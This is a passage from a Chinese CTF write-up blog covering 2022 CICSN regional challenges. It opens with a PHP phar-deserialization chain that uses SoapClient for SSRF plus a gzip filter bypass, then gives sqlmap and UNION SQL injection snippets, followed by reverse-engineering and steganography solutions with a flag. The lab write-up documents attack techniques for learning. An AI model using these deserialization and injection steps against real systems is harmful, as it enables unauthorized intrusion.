+<h4 id="思路3-原生类利用-phar内容检测绕过-getimagesize-phar反序列化"><a href="#思路3-原生类利用-phar内容检测绕过-getimagesize-phar反序列化" class="headerlink" title="思路3: 原生类利用+phar内容检测绕过+getimagesize+phar反序列化"></a>思路3: 原生类利用+phar内容检测绕过+getimagesize+phar反序列化</h4><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$clie</span>nt = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-built_in">array</span>(<span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&#x27;http://127.0.0.1/&#x27;</span> , <span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-string">&#x27;http://127.0.0.1/flag.php&#x27;</span>));<br><span class="hljs-symbol">$o</span>bj = <span class="hljs-keyword">new</span> Mysql()<br><span class="hljs-symbol">$o</span>bj-&gt;conn = <span class="hljs-symbol">$cle</span>nt<br><br><span class="hljs-symbol">$p</span>har = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;phar.phar&quot;</span>); <br><span class="hljs-symbol">$p</span>har-&gt;startBuffering();<br><span class="hljs-symbol">$p</span>har-&gt;setStub(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub</span><br><span class="hljs-symbol">$p</span>har-&gt;setMetadata(<span class="hljs-symbol">$o</span>bj);<br><span class="hljs-symbol">$p</span>har-&gt;addFromString(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-comment">//签名自动计算</span><br><span class="hljs-symbol">$p</span>har-&gt;stopBuffering();<br></code></pre></td></tr></table></figure>
+
+<p>将 phar 文件使用 gzip 命令进行压缩，可以看到压缩之后的文件中就没有了<code>php</code>，但不影响反序列化的结果。</p>
+<p>最后利用getimagesize进行phar反序列化绕过。</p>
+<h3 id="Ezsql"><a href="#Ezsql" class="headerlink" title="Ezsql"></a>Ezsql</h3><p>很容易找到触发点customer，sqlmap一波梭发现FI@g，但是返回</p>
+<h4 id="思路1-关键字绕过"><a href="#思路1-关键字绕过" class="headerlink" title="思路1: 关键字绕过"></a>思路1: 关键字绕过</h4><p>使用&#96;&#96;进行绕过，linux会作为命令执行，所以添加转义符号</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap ... -C  \`FI@g\`<br></code></pre></td></tr></table></figure>
+
+<h4 id="思路2：直接union进行无字段注入查询"><a href="#思路2：直接union进行无字段注入查询" class="headerlink" title="思路2：直接union进行无字段注入查询"></a>思路2：直接union进行无字段注入查询</h4><p>可以进行</p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">类似于 `1` 进行无字段注入<br></code></pre></td></tr></table></figure>
+
+<p>但因为一个字段一个值，所以也可以直接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">union select 1,(select * from xxxx),2,……<br></code></pre></td></tr></table></figure>
+
+<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="Easycry"><a href="#Easycry" class="headerlink" title="Easycry"></a>Easycry</h3><h4 id="思路：Findcrypt确认是AES，密文和key解出"><a href="#思路：Findcrypt确认是AES，密文和key解出" class="headerlink" title="思路：Findcrypt确认是AES，密文和key解出"></a>思路：Findcrypt确认是AES，密文和key解出</h4><p>AES S盒特征</p>
+<p><img src="/../imgs/20220619CICSNHDB/image-20220624140808585.png" srcset="/img/loading.gif" lazyload alt="image-20220624140808585"></p>
+<p>这里应该是key初始化</p>
+<img src="../imgs/20220619CICSNHDB/image_24-Hj9V-lr.png" srcset="/img/loading.gif" lazyload style="zoom:25%;" />
+
+<p>传入的这串数据应该就是key，没有看到有iv的传入值，应该就是ECB</p>
+<p>000102030405060708090A0B0C0D0E0F101112131415161718191A1B1C1D1E1F</p>
+<p><img src="/../imgs/20220619CICSNHDB/image_hXC_9J9Soa.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="Crackme2"><a href="#Crackme2" class="headerlink" title="Crackme2"></a>Crackme2</h3><h4 id="思路：Apk中的AES类和key写入tmp文件，so库中提取该key和iv，加密输入进行比对"><a href="#思路：Apk中的AES类和key写入tmp文件，so库中提取该key和iv，加密输入进行比对" class="headerlink" title="思路：Apk中的AES类和key写入tmp文件，so库中提取该key和iv，加密输入进行比对"></a>思路：Apk中的AES类和key写入tmp文件，so库中提取该key和iv，加密输入进行比对</h4><p><img src="/../imgs/20220619CICSNHDB/image_u4Iz1gbMGo.png" srcset="/img/loading.gif" lazyload></p>
+<p>将aes类以某种形式和key写入tmp文件</p>
+<p><img src="/../imgs/20220619CICSNHDB/image_DJnLAAd2ba.png" srcset="/img/loading.gif" lazyload></p>
+<p>看到aesEncrypt中encrypt，可以看到是cbc模式下，但是在apk中没有调用，转过头去看so文件中jni调用</p>
+<p><img src="/../imgs/20220619CICSNHDB/image_K42EP6mmI-.png" srcset="/img/loading.gif" lazyload></p>
+<p>apk解压提取so</p>
+<p><img src="/../imgs/20220619CICSNHDB/image_qIg8L77pCi.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以猜到这里应该调用了encrypt，这里应该就是iv</p>
+<p><img src="/../imgs/20220619CICSNHDB/image_P0fCDgsEty.png" srcset="/img/loading.gif" lazyload></p>
+<p>下面就是要找密文</p>
+<img src="../imgs/20220619CICSNHDB/image-20220624142537662.png" srcset="/img/loading.gif" lazyload alt="image-20220624142537662" style="zoom:25%;" />
+
+<img src="../imgs/20220619CICSNHDB/image_bU6qJVKNOf.png" srcset="/img/loading.gif" lazyload style="zoom:33%;" />
+
+<p>万事俱备，接一下（hex输出一下），拿去验证一</p>
+<img src="../imgs/20220619CICSNHDB/image_dgwIXuKV20.png" srcset="/img/loading.gif" lazyload style="zoom:33%;" />
+
+<img src="../imgs/20220619CICSNHDB/image_ZyUew6tSIn.png" srcset="/img/loading.gif" lazyload style="zoom:25%;" />
+
+<blockquote>
+<p>这两个部分的RE作出来的感觉像取证，这个题应该会被吐槽吧，而且都是AES，MIsc也有AES，真绝了，他们出题人是跟AES有多大的仇。</p>
+</blockquote>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Pikalang"><a href="#Pikalang" class="headerlink" title="Pikalang"></a>Pikalang</h2><h3 id="解题思路及过程"><a href="#解题思路及过程" class="headerlink" title="解题思路及过程"></a>解题思路及过程</h3><p>用zsteg发现有奇怪数据</p>
+<img src="../imgs/20220619CICSNHDB/image_0pLnOeMePJ.png" srcset="/img/loading.gif" lazyload style="zoom:25%;" />
+
+<p>直接base64，但是pikalang不太对</p>
+<img src="../imgs/20220619CICSNHDB/image_QZKMj3LCb7.png" srcset="/img/loading.gif" lazyload style="zoom:25%;" />
+
+<p>怀疑提取数据少了，手工提一下</p>
+<img src="../imgs/20220619CICSNHDB/image_icZKHEHr6t.png" srcset="/img/loading.gif" lazyload style="zoom:25%;" />
+
+<p>base64+pikalang</p>
+<img src="../imgs/20220619CICSNHDB/image_bPdUMZbSzT.png" srcset="/img/loading.gif" lazyload style="zoom:25%;" />
+
+<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p>flag{d6246d1f41fad032ee30193f3af15408}</p>
+<h2 id="Snowberg"><a href="#Snowberg" class="headerlink" title="Snowberg"></a>Snowberg</h2><h3 id="解题思路及过程-1"><a href="#解题思路及过程-1" class="headerlink" title="解题思路及过程"></a>解题思路及过程</h3><p>发现一个ZIP</p>
+<img src="../imgs/20220619CICSNHDB/image_cIxXKJnS3a.png" srcset="/img/loading.gif" lazyload style="zoom:25%;" />
+
+<p>提取</p>
+<p><img src="/../imgs/20220619CICSNHDB/image_SjgcV06qSZ.png" srcset="/img/loading.gif" lazyload></p>
+<p>大小只有6字节，考虑crc爆破</p>
+<p><img src="/../imgs/20220619CICSNHDB/image_AhlYouG5Re.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">python2 ~/Downloads/crc32-master/crc32.py reverse 0x17B1A8BC<br>6 bytes: 1s\_k3y (OK)<br>6 bytes: und\_th (OK)<br>6 bytes: y0u\_f0 (OK)<br>y0u\_f0und\_th1s\_k3y<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>获得Key：63f0c7380cc3a35</li>
+</ul>
+<blockquote>
+<p>因为是key，所以也试了很多图片隐写的解密 lsb啥的，但都不行，最后还是回过头来看crc了，正好因为上上个月的ichunqiu比赛里有crc隐写，然后尝试了一下，就可以。</p>
+</blockquote>
+<p><img src="/../imgs/20220619CICSNHDB/image-20220624141543273.png" srcset="/img/loading.gif" lazyload alt="image-20220624141543273"></p>
+<p><img src="/../imgs/20220619CICSNHDB/image_FB1Wjp8Vhf.png" srcset="/img/loading.gif" lazyload></p>
+<p>惊讶住了。正好和cap的加密方式一样。</p>
+<p><img src="/../imgs/20220619CICSNHDB/image_kKxC1COteL.png" srcset="/img/loading.gif" lazyload></p>
+<p>拿key出了。</p>
+<p><img src="/../imgs/20220619CICSNHDB/image_h0kxJxg4wG.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="folder’s-revenge"><a href="#folder’s-revenge" class="headerlink" title="folder’s revenge"></a>folder’s revenge</h2><h4 id="思路：文件隐写，Inflate解压缩"><a href="#思路：文件隐写，Inflate解压缩" class="headerlink" title="思路：文件隐写，Inflate解压缩"></a>思路：文件隐写，Inflate解压缩</h4><p>简单看了一圈，没有flag</p>
+<img src="../imgs/20220619CICSNHDB/image_cRzDDJ9dsW.png" srcset="/img/loading.gif" lazyload style="zoom:25%;" />
+
+<img src="../imgs/20220619CICSNHDB/image_QbOBANp1zP.png" srcset="/img/loading.gif" lazyload style="zoom:25%;" />
+
+<p>大小crc都一样，</p>
+<p>发现有一个问题，这里是202个files，但是文件夹里只有201个</p>
+<p><img src="/../imgs/20220619CICSNHDB/image_bfyee4QYo0.png" srcset="/img/loading.gif" lazyload></p>
+<img src="../imgs/20220619CICSNHDB/image_LEbs_NHCKy.png" srcset="/img/loading.gif" lazyload style="zoom: 33%;" />
+
+<p><img src="/../imgs/20220619CICSNHDB/image_vI-A9ixbsy.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/../imgs/20220619CICSNHDB/image_lgM4sKVtmB.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/../imgs/20220619CICSNHDB/image_MffanHtnNU.png" srcset="/img/loading.gif" lazyload></p>
+<p>结合提示，用010editor把这部分compression的data提取出来，用Inflate解压，cyberchef我的神。</p>
+<p><img src="/../imgs/20220619CICSNHDB/image-20220624141801022.png" srcset="/img/loading.gif" lazyload alt="image-20220624141801022"></p>
+<p><img src="/../imgs/20220619CICSNHDB/image-20220624141937846.png" srcset="/img/loading.gif" lazyload alt="image-20220624141937846"></p>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/ctfwp/" class="category-chain-item">ctfwp</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2022-CICSN华东北-Web/Re/Misc-部分Wp</div>
+      <div>https://www.imfengyuan.info/2022/06/25/20220619CICSNHDB/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>k3</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年6月25日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            BY K3
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/06/27/20220627Bsides/" title="2022-BsideTLVCTF-Misc-部分Wp">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2022-BsideTLVCTF-Misc-部分Wp</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/06/15/20220615CICSN/" title="2022-CICSN-Misc-Wp">
+                        <span class="hidden-mobile">2022-CICSN-Misc-Wp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
